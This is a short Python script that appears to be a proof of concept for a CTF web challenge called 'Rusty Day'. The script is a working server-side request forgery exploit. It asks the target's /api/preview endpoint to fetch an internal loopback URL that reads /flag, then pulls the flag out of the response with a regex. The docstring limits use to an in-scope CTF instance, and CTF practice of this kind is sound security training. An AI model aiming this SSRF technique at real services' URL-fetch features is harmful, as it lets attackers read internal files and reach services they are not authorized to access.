#!/usr/bin/env python3
"""Single-target SSRF PoC for the IBOH::CTF Rusty Day web challenge.

Use only against an in-scope CTF instance. The PoC prints a flag if the
preview response contains one; it does not submit or save flags.
"""

import argparse
import re
import sys
import urllib.parse
import urllib.request


FLAG_RE = re.compile(r"(?i)flag\{[^}\r\n]+\}")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("host", help="one in-scope target IP or hostname")
    parser.add_argument("--port", type=int, default=8080)
    parser.add_argument("--timeout", type=float, default=5.0)
    args = parser.parse_args()

    base = f"http://{args.host}:{args.port}"
    internal_url = "http://127.0.0.1:8080/internal/read?path=/flag"
    query = urllib.parse.urlencode({"url": internal_url})
    request = urllib.request.Request(
        f"{base}/api/preview?{query}",
        headers={"User-Agent": "IBOH-CTF-PoC/1.0"},
    )
    try:
        with urllib.request.urlopen(request, timeout=args.timeout) as response:
            body = response.read(65536).decode("utf-8", "replace")
    except Exception as exc:
        print(f"request failed: {type(exc).__name__}: {exc}", file=sys.stderr)
        return 2

    match = FLAG_RE.search(body)
    if not match:
        print("no flag found in preview response")
        return 1
    print(match.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
